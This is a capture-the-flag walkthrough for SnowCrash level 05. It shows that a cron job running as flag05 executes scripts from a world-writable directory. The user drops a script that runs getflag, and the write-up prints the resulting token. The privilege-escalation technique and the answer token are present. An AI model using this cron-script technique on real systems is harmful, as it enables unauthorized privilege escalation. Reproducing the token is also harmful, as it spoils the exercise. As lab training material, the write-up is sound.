# LEVEL 05

## Summary

In this level, a cron job is running every 2 minutes as user flag05. This cron job executes scripts in /opt/openarenaserver. We can write and execute files in this directory as level05, so we can create a script that will run the getflag command and write the output to a file we can read.

## Workflow

1. First hint appears when connecting to the VM:
	```
	ssh level05@<VM_IP> -p 4242
		_____                      _____               _     
		/ ____|                    / ____|             | |    
		| (___  _ __   _____      _| |     _ __ __ _ ___| |__  
		\___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
		____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
		|_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
														
		Good luck & Have fun

	level05@<VM_IP>'s password: 
	You have new mail.
	```

2. Checking the env, find a MAIL variable : it's a file so let's cat it :
	```
	level05@SnowCrash:~$ env
	...
	MAIL=/var/mail/level05
	...
	```
	```
	level05@SnowCrash:~$ cat /var/mail/level05
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
	```

3. It's a cron job running every 2 minutes, executing /usr/sbin/openarenaserver as user flag05. Therefore in this file the getflag command would be executed as flag05 and provides the flag. This file execute each script in /opt/openarenaserver, then remove .
	```
	level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done
	```

4. Check the rights on /opt/openarenaserver, we can write and execute files there as level05.
	```
	level05@SnowCrash:~$ getfacl /opt/openarenaserver
	getfacl: Removing leading '/' from absolute path names
	# file: opt/openarenaserver
	# owner: root
	# group: root
	user::rwx
	user:level05:rwx
	user:flag05:rwx
	group::r-x
	mask::rwx
	other::r-x
	default:user::rwx
	default:user:level05:rwx
	default:user:flag05:rwx
	default:group::r-x
	default:mask::rwx
	default:other::r-x
	```

5. Create a script that will write the flag in /tmp/flag with getflag command, then wait for the cron to execute it (in 2 minutes max).
	```
	level05@SnowCrash:~$ echo "
	#!/bin/bash
	getflag > /tmp/flag" > /opt/openarenaserver/getit
	```

6. Finally in /tmp/flag
	```
	level05@SnowCrash:~$ cat /tmp/flag
	Check flag.Here is your token : viuaaale9huek52boumoomioc
	```